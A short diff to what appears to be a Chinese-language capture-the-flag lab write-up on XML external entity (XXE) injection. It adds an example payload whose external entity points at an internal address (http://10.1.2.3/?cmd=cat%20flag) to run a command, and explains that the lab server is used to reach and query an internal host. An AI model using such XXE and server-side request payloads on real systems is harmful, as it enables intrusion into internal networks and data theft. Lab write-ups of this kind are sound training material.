@@ -19,3 +19,10 @@ Date: 2026-01-05
 ```
 
 根据提示更改DTD声明的SYSTEM内容即可获取数据
+
+例如，空格使用url编码形式
+```http
+<!DOCTYPE root [<!ENTITY guc SYSTEM "http://10.1.2.3/?cmd=cat%20flag">]>
+```
+
+因此，实际上是借用此靶场调用了http伪协议从而访问了内网主机，在内网回显信息，而不是在本靶场
